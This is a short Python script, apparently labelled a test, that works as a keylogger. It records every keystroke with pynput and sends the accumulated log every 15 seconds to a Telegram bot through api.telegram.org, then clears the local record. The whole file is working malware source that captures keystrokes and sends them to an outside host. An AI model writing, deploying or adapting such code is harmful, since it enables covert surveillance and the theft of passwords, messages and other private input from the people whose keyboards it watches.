from pynput import keyboard
import os
import requests
from dotenv import load_dotenv
from threading import Timer

load_dotenv()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

ARQUIVO = ""
log = ""

def enviar_telegram():
    global log

    try:
        if os.path.exists(ARQUIVO):
            with open(ARQUIVO, "r", encoding="utf-8") as arquivo:
                log = arquivo.read()

        if log:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

            resposta = requests.post(
                url,
                data={
                    "chat_id": CHAT_ID,
                    "text": "Registro do teste:\n" + log
                },
                timeout=15
            )

            resposta.raise_for_status()

            print("Mensagem enviada com sucesso!")

            log = ""

            with open(ARQUIVO, "w", encoding="utf-8") as arquivo:
                arquivo.write("")

    except Exception as e:
        print("Erro ao enviar:", e)

    Timer(15, enviar_telegram).start()


def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass
        
with keyboard.Listener(on_press=on_press) as listener:
    enviar_telegram()
    listener.join()